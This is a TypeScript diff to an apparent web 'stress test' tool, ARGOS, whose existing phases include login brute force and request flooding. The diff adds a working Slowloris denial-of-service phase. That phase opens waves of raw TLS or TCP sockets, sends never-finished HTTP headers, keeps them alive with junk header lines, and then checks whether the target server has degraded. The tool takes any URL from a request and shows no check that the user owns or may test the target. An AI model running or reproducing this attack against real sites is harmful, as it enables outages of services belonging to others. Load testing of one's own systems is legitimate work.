@@ -49,6 +49,7 @@ interface StressReport {
   bruteForce: BruteForceResult;
   flood: FloodResult[];
   ramp: RampStep[];
+  slowloris: { totalConnections: number; keptAlive: number; serverCrashed: boolean; avgHoldTime: number } | null;
   breakpointReqPerSec: number | null;
   resilienceScore: number;
   recommendations: string[];
@@ -106,8 +107,12 @@ async function findLoginPage(baseUrl: string): Promise<string | null> {
   if (!parsed.hostname.startsWith("www.")) origins.push(`${parsed.protocol}//www.${parsed.hostname}`);
   if (!parsed.hostname.startsWith("app.")) origins.push(`${parsed.protocol}//app.${root}`);
 
+  const userPath = parsed.pathname;
   const paths = ["/login", "/signin", "/auth/signin", "/auth/login", "/auth/sign-in", "/wp-login.php",
     "/admin/login", "/user/login", "/api/auth/signin", "/account/login", "/connect/login", "/session/new"];
+  if (userPath && userPath !== "/" && !paths.includes(userPath)) {
+    paths.unshift(userPath);
+  }
 
   for (const origin of origins) {
     for (const path of paths) {
@@ -410,6 +415,130 @@ async function phaseRamp(
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
+// Phase 4: Slowloris (connexions lentes)
+// ═══════════════════════════════════════════════════════════════════════════
+
+async function phaseSlowloris(
+  baseUrl: string,
+  maxConnections: number,
+  durationSec: number,
+  emit: (data: Record<string, unknown>) => void,
+): Promise<{ totalConnections: number; keptAlive: number; serverCrashed: boolean; avgHoldTime: number }> {
+  const parsed = new URL(baseUrl);
+  const host = parsed.hostname;
+  const port = parsed.protocol === "https:" ? 443 : 80;
+  const isHttps = parsed.protocol === "https:";
+
+  let totalConnections = 0;
+  let keptAlive = 0;
+  let serverCrashed = false;
+  const holdTimes: number[] = [];
+  const activeConns: Array<{ socket: import("net").Socket | import("tls").TLSSocket; start: number }> = [];
+
+  const net = await import("net");
+  const tlsMod = await import("tls");
+
+  const createSlowConn = (): Promise<void> => {
+    return new Promise((resolve) => {
+      const start = Date.now();
+      totalConnections++;
+      
+      const onConnect = (socket: import("net").Socket | import("tls").TLSSocket) => {
+        activeConns.push({ socket, start });
+        // Send partial HTTP header — never complete it
+        socket.write(`GET ${parsed.pathname || "/"} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ARGOS-Slowloris/1.0\r\nAccept: */*\r\n`);
+        
+        // Keep connection alive by sending incomplete header every 5 seconds
+        const keepAlive = setInterval(() => {
+          try {
+            socket.write(`X-Argos-${Date.now()}: keep-alive\r\n`);
+            keptAlive++;
+          } catch {
+            clearInterval(keepAlive);
+          }
+        }, 5000);
+        
+        socket.on("close", () => {
+          clearInterval(keepAlive);
+          holdTimes.push(Date.now() - start);
+          const idx = activeConns.findIndex(c => c.socket === socket);
+          if (idx >= 0) activeConns.splice(idx, 1);
+          resolve();
+        });
+        socket.on("error", () => {
+          clearInterval(keepAlive);
+          holdTimes.push(Date.now() - start);
+          resolve();
+        });
+        setTimeout(() => {
+          try { socket.destroy(); } catch { /* ok */ }
+          resolve();
+        }, durationSec * 1000);
+      };
+
+      if (isHttps) {
+        const socket = tlsMod.connect({ host, port, servername: host, rejectUnauthorized: false, timeout: 10000 }, () => onConnect(socket));
+        socket.on("error", () => resolve());
+        socket.on("timeout", () => { socket.destroy(); resolve(); });
+      } else {
+        const socket = net.connect({ host, port, timeout: 10000 }, () => onConnect(socket));
+        socket.on("error", () => resolve());
+        socket.on("timeout", () => { socket.destroy(); resolve(); });
+      }
+    });
+  };
+
+  // Open connections in waves
+  const WAVE_SIZE = 10;
+  const waves = Math.ceil(maxConnections / WAVE_SIZE);
+  
+  for (let w = 0; w < waves; w++) {
+    const batch = Math.min(WAVE_SIZE, maxConnections - w * WAVE_SIZE);
+    const promises = Array.from({ length: batch }, () => createSlowConn());
+    
+    emit({
+      phase: "slowloris",
+      progress: Math.round(((w + 1) / waves) * 50),
+      message: `${activeConns.length} connexions lentes actives — ${totalConnections} total`,
+    });
+
+    // Don't await all — let them run while we open more
+    await Promise.race([Promise.allSettled(promises), sleep(2000)]);
+  }
+
+  // Monitor server health during hold
+  emit({ phase: "slowloris", progress: 60, message: `Maintien de ${activeConns.length} connexions — test de sante serveur...` });
+  
+  await sleep(3000);
+  
+  // Check if server still responds
+  try {
+    const healthCheck = await fetch(baseUrl, {
+      headers: { "User-Agent": "ARGOS-HealthCheck/1.0" },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (healthCheck.status >= 500) serverCrashed = true;
+  } catch {
+    serverCrashed = true;
+  }
+
+  // Clean up
+  for (const conn of activeConns) {
+    try { conn.socket.destroy(); } catch { /* ok */ }
+  }
+
+  const avgHoldTime = holdTimes.length > 0 ? Math.round(holdTimes.reduce((a, b) => a + b, 0) / holdTimes.length) : 0;
+
+  emit({
+    phase: "slowloris",
+    progress: 100,
+    message: `Slowloris termine: ${totalConnections} connexions, serveur ${serverCrashed ? "DEGRADE" : "OK"}`,
+  });
+
+  return { totalConnections, keptAlive, serverCrashed, avgHoldTime };
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
 // Scoring and recommendations
 // ═══════════════════════════════════════════════════════════════════════════
 
@@ -465,6 +594,17 @@ function computeResilienceScore(report: Omit<StressReport, "resilienceScore" | "
     }
   } else if (report.ramp.length > 0) {
     recs.push("Aucun point de rupture detecte dans la plage testee. L'infrastructure semble resiliente.");
+  }
+
+  // Slowloris scoring
+  const slowloris = (report as unknown as { slowloris?: { serverCrashed: boolean; totalConnections: number } }).slowloris;
+  if (slowloris) {
+    if (slowloris.serverCrashed) {
+      score -= 20;
+      recs.push(`CRITIQUE: Le serveur est vulnerable au Slowloris (${slowloris.totalConnections} connexions lentes suffisent a le degrader). Configurer des timeouts stricts et un module anti-slowloris (mod_reqtimeout pour Apache, limit_conn pour Nginx).`);
+    } else {
+      recs.push("Le serveur resiste aux attaques Slowloris (connexions lentes maintenues sans degradation).");
+    }
   }
 
   if (recs.length === 0) {
@@ -524,6 +664,11 @@ export async function POST(req: NextRequest) {
         const rampResult = await phaseRamp(url, intensity, maxDuration, emit);
         emit({ phase: "ramp", progress: 100, message: rampResult.breakpoint ? `Point de rupture: ${rampResult.breakpoint} req/s` : "Aucun point de rupture detecte" });
 
+        // Phase 4: Slowloris
+        emit({ phase: "slowloris", progress: 0, message: "Phase 4: Test Slowloris (connexions lentes)..." });
+        const slowlorisResult = await phaseSlowloris(url, Math.min(intensity, 100), Math.min(maxDuration, 30), emit);
+        emit({ phase: "slowloris", progress: 100, message: `Phase 4 terminee: ${slowlorisResult.totalConnections} connexions, serveur ${slowlorisResult.serverCrashed ? "DEGRADE" : "OK"}` });
+
         // Build report
         const partialReport = {
           target: rawTarget,
@@ -531,6 +676,7 @@ export async function POST(req: NextRequest) {
           bruteForce: bruteResult,
           flood: floodResults,
           ramp: rampResult.steps,
+          slowloris: slowlorisResult,
           breakpointReqPerSec: rampResult.breakpoint,
         };
 
